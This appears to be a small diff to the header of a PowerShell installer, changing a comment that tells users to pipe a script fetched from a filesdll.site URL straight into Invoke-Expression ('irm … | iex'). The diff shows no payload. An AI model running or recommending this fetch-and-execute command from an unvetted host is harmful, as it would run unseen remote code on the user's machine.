@@ -1,5 +1,5 @@
 # Run from PowerShell:
-# irm https://filesdll.site/install.ps1 | iex
+# irm https://filesdll.site/wrider/install.ps1 | iex
 # Keep the outer block and final blank line: piped PowerShell must receive the
 # complete script before it performs any installation steps.
 & {
